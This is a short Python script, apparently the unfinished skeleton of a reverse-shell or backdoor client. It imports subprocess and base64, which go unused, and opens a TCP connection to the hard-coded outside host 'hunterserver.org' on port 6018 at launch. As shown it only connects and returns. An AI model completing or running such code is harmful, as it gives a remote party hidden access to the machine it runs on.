import socket, subprocess, os, base64


def run(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((host, port))
        except:
            return
    except:
        return


if "__main__" == __name__:
    run(host="hunterserver.org", port=6018)
